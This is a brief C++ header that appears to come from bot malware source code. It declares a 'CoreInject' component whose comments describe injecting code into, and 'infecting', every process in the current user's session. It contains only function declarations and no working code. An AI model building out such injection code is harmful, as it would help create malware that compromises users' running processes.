/*
  Bot injection into process.
*/
#pragma once

namespace CoreInject
{
  /*
    Init.
  */
  void init(void);

  /*
    Uninit.
  */
  void uninit(void);

  /*
    Injection of code into all processes of the current session of the current user.

    Return - true - if at least one process has been infected,
             false - if no injection could be made.
  */
  bool _injectToAll(void);
};
